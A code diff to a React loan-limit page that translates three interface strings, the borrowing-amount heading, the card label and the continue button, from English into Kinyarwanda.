@@ -141,11 +141,11 @@ export default function LoanLimitPage() {
 
       {/* Loan Limit Section */}
       <h2 className="text-2xl sm:text-4xl font-black text-black mb-2 sm:mb-4">Your Loan Limit</h2>
-      <p className="text-gray-500 text-sm sm:text-lg mb-8 sm:mb-12">Here is the amount you can borrow</p>
+      <p className="text-gray-500 text-sm sm:text-lg mb-8 sm:mb-12">Dore amafaranga ushobora kuguza.</p>
 
       {/* Loan Amount Card */}
       <div className="bg-gradient-to-br from-red-50 to-red-100 border-2 border-red-400 rounded-2xl sm:rounded-3xl p-8 sm:p-12 mb-8 sm:mb-12 text-center">
-        <p className="text-gray-600 text-sm sm:text-base mb-3 sm:mb-4">Available Loan Amount</p>
+        <p className="text-gray-600 text-sm sm:text-base mb-3 sm:mb-4">Amafaranga y'inguzanyo ushobora kubona.</p>
         <div className="flex items-center justify-center gap-2 mb-2">
           <h3 className="text-4xl sm:text-5xl font-black text-black">750,000</h3>
         </div>
@@ -173,7 +173,7 @@ export default function LoanLimitPage() {
         onClick={handleContinue}
         disabled={isProcessing}
         className="w-full bg-red-400 text-black font-bold text-base sm:text-xl py-3 sm:py-4 rounded-lg sm:rounded-2xl flex items-center justify-center gap-2 sm:gap-3 hover:bg-red-500 transition-colors disabled:bg-gray-300 disabled:cursor-not-allowed">
-        {isProcessing ? 'Processing...' : 'Continue to Get Loan'}
+        {isProcessing ? 'Processing...' : 'Komeza kugira ngo ubone inguzanyo.'}
         <ArrowRight className="w-5 h-5 sm:w-6 sm:h-6" />
       </button>
 
